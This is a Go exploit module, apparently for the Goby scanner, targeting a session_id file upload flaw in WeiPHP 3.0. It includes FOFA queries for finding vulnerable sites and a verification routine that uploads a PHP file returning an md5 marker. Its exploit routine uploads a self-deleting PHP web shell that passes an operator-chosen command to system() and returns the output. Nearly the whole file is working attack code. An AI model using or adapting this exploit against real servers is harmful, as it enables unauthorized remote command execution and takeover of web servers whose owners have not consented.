package exploits

import (
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WeiPHP 3.0 session_id file upload vulnerability",
    "Description": "<p>weiphp is a WeChat development platform based on ThinkPHP, open source, efficient and concise.</p><p>WeiPHP 3.0 has a file upload vulnerability. Attackers can upload files of dangerous types without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "WeiPHP",
    "Homepage": "https://www.weiphp.cn/",
    "DisclosureDate": "2021-11-08",
    "Author": "",
    "FofaQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "GobyQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "Level": "3",
    "Impact": "<p>WeiPHP 3.0 has a file upload vulnerability. Attackers can upload files of dangerous types without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.weiphp.cn/\">https://www.weiphp.cn/</a></p>",
    "Translation": {
        "EN": {
            "Name": "WeiPHP 3.0 session_id file upload vulnerability",
            "Product": "WeiPHP",
            "Description": "<p>weiphp is a WeChat development platform based on ThinkPHP, open source, efficient and concise.</p><p>WeiPHP 3.0 has a file upload vulnerability. Attackers can upload files of dangerous types without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.weiphp.cn/\" target=\"_blank\">https://www.weiphp.cn/</a><br></p>",
            "Impact": "<p>WeiPHP 3.0 has a file upload vulnerability. Attackers can upload files of dangerous types without restrictions, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "References": [
        "https://www.uedbox.com/post/13255/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpshell",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.1",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10213"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		// PoC 函数
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			tit := "/Home/File/upload/session_id/scevs8hub3m5ogla05a421hb42.html"
			tit = url.QueryEscape(tit)
			uri := "/index.php?s=" + tit
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------e37a54d7d5380c9f")
			cfg.VerifyTls = false
			rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
			sui := fmt.Sprintf("%06v", rnd.Int31n(1000000))
			cfg.Data = "--------------------------e37a54d7d5380c9f\nContent-Disposition: form-data; name=\"download\"; filename=\"" + sui + ".php\"\nContent-Type: application/octet-stream\n\n<?php\necho(md5(88));\n @unlink (__FILE__);\n\n\n--------------------------e37a54d7d5380c9f--\n"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				r := regexp.MustCompile("/Uploads(.*?).php")
				wen := r.FindString(resp.Utf8Html)
				uri := strings.Replace(wen, "\\", "", -1)
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
					return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "2a38a4a9316c49e5a833517c45d31070")
				}
				return false
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			tit := "/Home/File/upload/session_id/scevs8hub3m5ogla05a421hb42.html"
			tit = url.QueryEscape(tit)
			uri := "/index.php?s=" + tit
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------e37a54d7d5380c9f")
			cfg.VerifyTls = false
			rnd := rand.New(rand.NewSource(time.Now().UnixNano()))
			sui := fmt.Sprintf("%06v", rnd.Int31n(1000000))
			phpshell := ss.Params["phpshell"].(string)
			cfg.Data = "--------------------------e37a54d7d5380c9f\nContent-Disposition: form-data; name=\"download\"; filename=\"" + sui + ".php\"\nContent-Type: application/octet-stream\n\n<?php\nsystem(\"" + phpshell + "\");\n @unlink (__FILE__);\n\n--------------------------e37a54d7d5380c9f--\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				r := regexp.MustCompile("/Uploads(.*?).php")
				wen := r.FindString(resp.Utf8Html)
				uri := strings.Replace(wen, "\\", "", -1)
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
										expResult.Output = resp.Utf8Html
										expResult.Success = true
				}
			}
			return expResult
		},
	))
}
